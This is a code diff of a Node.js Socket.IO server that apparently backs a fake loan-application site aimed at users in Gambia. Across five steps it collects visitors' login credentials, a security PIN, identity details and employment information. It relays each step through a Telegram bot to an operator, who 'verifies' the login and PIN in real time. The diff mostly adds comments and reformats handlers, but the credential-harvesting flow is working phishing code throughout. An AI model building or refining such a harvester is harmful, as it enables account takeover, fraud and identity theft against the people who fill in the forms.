@@ -46,25 +46,39 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
 });
 
 io.on('connection', (socket) => {
+    // Generate a unique AppID for the session
     const appId = `GMB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
     socket.join(appId);
     
     console.log(`🔌 Gambia User connected: ${appId}`);
     socket.emit('session-ready', { appId: appId });
 
+    // Step 1: Login Credentials (Frontend Step 1 -> Triggers Admin Verification)
     socket.on('step4', (data) => {
         botManager.sendToAdmin(appId, "🇬🇲 Step 1: Login Credentials", data, true);
     });
 
+    // Step 2: Security PIN Submission (Frontend Step 2 -> Triggers Final PIN Verification)
     socket.on('step5', (data) => {
         if (data && data.pin) {
             botManager.sendFinalApproval(appId, data.pin);
         }
     });
 
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 3: Loan Details", data, false));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 4: Identity Verification", data, false));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 5: Employment Info", data, false));
+    // Step 3: Loan Details (Frontend Step 3 -> Notification Only)
+    socket.on('step1', (data) => {
+        botManager.sendToAdmin(appId, "🇬🇲 Step 3: Loan Details", data, false);
+    });
+
+    // Step 4: Identity Verification (Frontend Step 4 -> Notification Only)
+    socket.on('step2', (data) => {
+        botManager.sendToAdmin(appId, "🇬🇲 Step 4: Identity Verification", data, false);
+    });
+
+    // Step 5: Employment Information (Frontend Step 5 -> Final Submission Notification)
+    socket.on('step3', (data) => {
+        botManager.sendToAdmin(appId, "🇬🇲 Step 5: Employment Info", data, false);
+    });
 
     socket.on('disconnect', () => {
         console.log(`🔌 User disconnected: ${appId}`);
@@ -83,6 +97,6 @@ server.listen(PORT, async () => {
             console.error('❌ Webhook Setup Error:', err.message);
         }
     } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL not found in environment settings.');
+        console.warn('⚠️ RENDER_EXTERNAL_URL not found in environment settings. Using long polling fallbacks if configured.');
     }
 });
